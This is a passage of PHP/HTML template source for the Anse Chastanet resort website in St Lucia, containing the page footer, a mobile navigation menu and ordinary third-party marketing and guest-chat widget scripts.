           <a href="tel:1-800-223-1108">1-800-223-1108</a><br/>
         </p>
 
         </div>
 
           <div class="links-middle">
             <p>Get Social With Us<br/>
             <a href="http://www.facebook.com/ANSECHASTANET" target="_blank"><img src="images/social media logos/fb.png" alt="Facebook Page" /></a>
             <a href="https://wa.me/17584822151" target="_blank"><img src="https://ansechastanet.com/images/social media logos/whatsapp-logo-green.png" alt="WhatsApp" /></a>
             <a href="http://www.twitter.com/ANSECHASTANET" target="_blank"><img src="images/social media logos/tw.png" alt="Twitter Page" /></a>
             <a href="http://www.pinterest.com/ANSECHASTANET" target="_blank"><img src="images/social media logos/in.png" alt="Instagram Page" /></a>
             <a href="http://www.instagram.com/ANSECHASTANET" target="_blank"><img src="images/social media logos/pi.png" alt="Pinterest Page" /></a>
             </p>
             <p>
             </p>
             <p>PO Box 7000<br/>
           Soufriere, St Lucia<br/>
           <a href="mailto:ansechastanet@ansechastanet.com">ansechastanet@ansechastanet.com</a><br/>
           </p>
 
           <p>
             Brochures: <br/> 
             <a href="https://ansechastanet.com/images/AnseChastanet-Brochure.pdf">English</a> | 
             <a href="https://ansechastanet.com/images/AnseChastanet_Brochure-Deutsch.pdf">Deutsch</a> |
             <a href="https://ansechastanet.com/images/AnseChastanet_Brochure-Francais.pdf">FRANÇAIS</a> <br/>
           </p>
           </div>
 
         <div class="links-right">
           <p>Our Other Sites:<br/>
           <a href="http://ansechastanet.de" target="_blank">Anse Chastanet DE</a><br/>
           <a href="http://ansechastanet.fr" target="_blank">Anse Chastanet FR</a><br/>
           <a href="http://elopetoparadiseweddings.com" target="_blank">Elope To Paradise Weddings</a><br/>
           <a href="http://jademountain.com" target="_blank">Jade Mountain</a><br/>
           <a href="http://scubastlucia.com" target="_blank">Scuba St Lucia</a><br/>
           Copyright Anse Chastanet Resort &copy; 2018<br/><a href="https://ansechastanet.com/privacy.html">Privacy &amp; Cookie Policy</a><br/>
           Built by <a href="http://newaveconsulting.com" target="_blank">New Ave Consulting</a>
           </p>
 
           </div>
 
       </div>
       </div>
 
       <div class="footer">
         <div>
           <img src="https://ansechastanet.com/images/ta-hof.png" alt="Trip Advisor Hall of Fame Anse Chastanet" />
 <img src="https://ansechastanet.com/images/tl-gold.png" alt="Travel Life Gold Anse Chastanet" />
 
           <a href="" target="_blank"><img src="images/T+L-WorldsBest-2016.jpg" alt="Travel + Leisure World's Best" /></a>
           <a href="http://www.tripadvisor.com/Hotel_Review-g147345-d148994-Reviews-Anse_Chastanet-Soufriere_Soufriere_Quarter_St_Lucia.html" target="_blank"><img src="images/trip_advisor_gl.png" alt="Green Leaders" /></a>
           <a href="http://www.ensembletravelgroup.com" target="_blank"><img src="https://ansechastanet.com/images/ensemble.jpg" alt="Ensemble" /></a>
           <a href="" target="_blank"><img src="images/aaaAward.gif" alt="Four Diamond Award" /></a>
         </div>
 
       </div>
 
       <div class="social-buttons">
         <a href="http://www.facebook.com/ANSECHASTANET" target="_blank"><img src="images/social media logos/fb.png" alt="Facebook Page" /></a>
         <a href="https://wa.me/17584822151" target="_blank"><img src="https://ansechastanet.com/images/social media logos/whatsapp-logo-green.png" alt="WhatsApp" /></a>
         <a href="http://www.twitter.com/ANSECHASTANET" target="_blank"><img src="images/social media logos/tw.png" alt="Twitter Page" /></a>
         <a href="http://www.pinterest.com/ANSECHASTANET" target="_blank"><img src="images/social media logos/in.png" alt="Instagram Page" /></a>
         <a href="http://www.instagram.com/ANSECHASTANET" target="_blank"><img src="images/social media logos/pi.png" alt="Pinterest Page" /></a>
       </div>
 
       <div class="mobile-menu">
         <i class="menu-close material-icons" style="font-size: 3.5em; display: block;">&#xE5CD;</i>
         <h4>&nbsp;</h4>
 
             <a href="https://ansechastanet.com"><span>Home</span></a>
 
             <h5>Reserve</h5>
             <a href="https://reservations.ansechastanet.com/114432"><span>Book Online</span></a>
             <a href="https://ansechastanet.com/reserve/rates/rates.html"><span>Rates &amp; Packages</span></a>
             <a href="https://ansechastanet.com/promotions.html"><span>Promotions</span></a>
             <a href="https://ansechastanet.com/reserve/reservation_request.html"><span>Reservation Request</span></a>
             <a href="https://ansechastanet.com/reserve/pre_arrival_concierge.html"><span>Pre-Arrival Concierge</span></a>
             <a href="https://ansechastanet.com/reserve/booking_info.html"><span>Booking Info</span></a>
             <a href="https://ansechastanet.com/reserve/returning_guests.html"><span>Returning Guests</span></a>
             <a href="https://ansechastanet.com/reserve/helipad.html"><span>Helipad</span></a>
             <a href="https://ansechastanet.com/shopping/gifts.html"><span>Gift Registry</span></a>
             <h5>Rooms</h5>
             <a href="https://ansechastanet.com/accommodations.html"><span>Rooms</span></a>
             <!--
             <a href="https://ansechastanet.com/accommodations.html#standard"><span>Standard</span></a>
             <a href="https://ansechastanet.com/accommodations.html#superior"><span>Superior</span></a>
             <a href="https://ansechastanet.com/accommodations.html#beachside"><span>Beachside</span></a>
             <a href="https://ansechastanet.com/accommodations.html#hillside"><span>Hillside</span></a>
             <a href="https://ansechastanet.com/accommodations.html#premium"><span>Premium</span></a>
             <a href="https://ansechastanet.com/accommodations.html#beach-house"><span>Beach House</span></a>
             <a href="https://ansechastanet.com/accommodations.html#pool-suite"><span>Pool Suite</span></a>
             -->
             <h5>Romance</h5>
             <a href="https://ansechastanet.com/weddings_and_honeymoons.html"><span>Overview</span></a>
             <a href="https://ansechastanet.com/weddings.html"><span>Weddings</span></a>
             <a href="https://ansechastanet.com/honeymoons.html"><span>Honeymoons</span></a>
 <a href="https://ansechastanet.com/vow-renewal.html"><span>Vow Renewal</span></a>
             <a href="https://ansechastanet.com/anniversaries.html"><span>Anniversaries</span></a>
             <h5>Cuisine</h5>
             <a href="https://ansechastanet.com/dining.html"><span class="nav-header">Cuisine</span></a>          
             <h5>Wellness</h5>
             <a href="https://ansechastanet.com/spa/spa.html"><span>Kai Belte Spa</span></a>
             <a href="https://ansechastanet.com/spa/spa_treatments.html"><span>Treatments</span></a>
             <a href="https://ansechastanet.com/spa/spa_reservations.html"><span>Spa Reservations</span></a>
             <a href="https://ansechastanet.com/spa/yoga.html"><span>Yoga</span></a>
             <!--<a href="https://ansechastanet.com/spa/fitness.html"><span>Fitness</span></a>-->
             <h5>Activities</h5>
             <a href="https://ansechastanet.com/art-classes.html"><span>Art Classes</span></a>
             <a href="https://ansechastanet.com/activities/scuba.html"><span>Scuba</span></a>
             <a href="https://ansechastanet.com/activities/watersports.html"><span>Water Sports</span></a>
             <a href="https://ansechastanet.com/activities/biking.html"><span>Jungle Biking</span></a>
             <a href="https://ansechastanet.com/activities/excursions.html"><span>Excursions</span></a>
             <a href="https://ansechastanet.com/activities/birdwatching.html"><span>Birdwatching</span></a>
             <a href="https://ansechastanet.com/emerald_farm.html"><span>Emerald Farm</span></a>
             <a href="https://ansechastanet.com/chocolate_lab.html"><span>Chocolate Lab</span></a>
             <a href="https://ansechastanet.com/beaches.html"><span>Beaches</span></a>
             <a href="https://ansechastanet.com/shopping/gifts.html"><span>Shopping</span></a>
             <a href="https://ansechastanet.com/activities/do_nothing.html"><span>Do Nothing</span></a>
         
             <h5>Events</h5>
             <a href="https://ansechastanet.com/events.html"><span>Culinary Events</span></a>
             <a href="https://ansechastanet.com/virtual-art-classes.html"><span>Virtual Art Classes</span></a>           
             <h5>News</h5>
             <a href="https://ansechastanet.com/blog"><span>Blog</span></a>
             <a href="https://ansechastanet.com/news_and_reviews/in-the-press.html"><span>In the Press</span></a>
             <a href="https://ansechastanet.com/news_and_reviews/awards_and_reviews.html"><span>Awards</span></a>
             <a href="https://ansechastanet.com/news_and_reviews/testimonials.html"><span>Testimonials</span></a>
             <a href="https://ansechastanet.com/environment.html"><span>Environment</span></a>
             <a href="https://ansechastanet.com/community.html"><span>Community</span></a>
             <a href="https://ansechastanet.com/ethics.html"><span>Ethics</span></a>
             <!--<a href="https://ansechastanet.com/blog/category/press-releases"><span>Press Releases</span></a>-->
             <a href="https://ansechastanet.com/reserve/press_info.html"><span>Press Info</span></a>
             <a href="https://ansechastanet.com/social.html"><span>Social Media</span></a>
 
       </div>
 
     </div>
 
   </div>
 
 
 <!-- Go to www.addthis.com/dashboard to customize your tools --> 
 <script async type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-58dd5d7487a776fa"></script>
 
 <!-- Trip Tease Tag -->
 <script async src="https://paperboy.triptease.net/87JyKBGQDo.js?hotelkey=cb6a05a81ba3c208ec92f55e9948831ccb35268f"></script>
 <!-- End Trip Tease Tag -->
 <!-- GuestConnexxion Widget Code -->
 <script src="https://widget.guestconnexxion.com/app.js"></script>
 <script type="text/javascript">
     GuestConnexxion("init", {
         app_id: "2993922e4b390b6e524fc2f1e4e3bf13"
     });
 </script>
 <!-- GuestConnexxion Widget Code -->
 </body>
 
 </html>
 

 <?php
}
?>